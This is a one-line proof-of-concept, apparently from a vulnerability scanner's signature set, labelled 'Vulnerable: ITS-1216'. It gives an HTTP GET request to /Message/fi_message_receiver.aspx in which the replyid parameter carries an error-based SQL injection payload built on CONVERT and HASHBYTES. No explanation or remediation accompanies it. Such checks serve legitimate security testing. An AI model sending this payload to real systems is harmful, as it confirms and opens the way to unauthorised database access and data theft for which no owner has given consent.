# Vulnerable: ITS-1216
GET /Message/fi_message_receiver.aspx?replyid=1%20and%201=CONVERT(VARCHAR(32),HASHBYTES('MD5','123'),2)--+
